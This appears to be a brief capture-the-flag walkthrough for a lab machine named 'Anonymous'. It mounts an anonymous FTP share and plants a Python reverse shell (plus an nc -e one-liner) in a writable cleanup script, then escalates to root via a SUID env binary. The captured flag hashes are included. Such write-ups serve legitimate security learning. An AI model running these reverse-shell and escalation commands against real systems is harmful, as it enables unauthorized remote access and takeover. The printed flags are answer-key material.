### Anonymous ###

export IP=10.10.79.109

found clean.sh in the ftp server

nc -e /bin/sh 10.11.18.102 1234



#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi


# curlftpfs

Found a tool which allows you to basically mount the ftp shares to my machine...


mkdir -p ftp_anonymous
curlftpfs anonymous@10.10.79.109 ftp_anonymous
cd ftp_anonymous
ls

Now i can edit the clean.sh as i intended and insert this cmd:

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.18.102",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


# User.txt:

90d6f992585815ff991e68748c414740

find / -perm +u=s 2>/dev/null

/usr/bin/env has a SUID bit:GTFOBins rocks:
/usr/bin/env /bin/sh -p


# Root.txt:
4d930091c31a622a7ed10f27999af363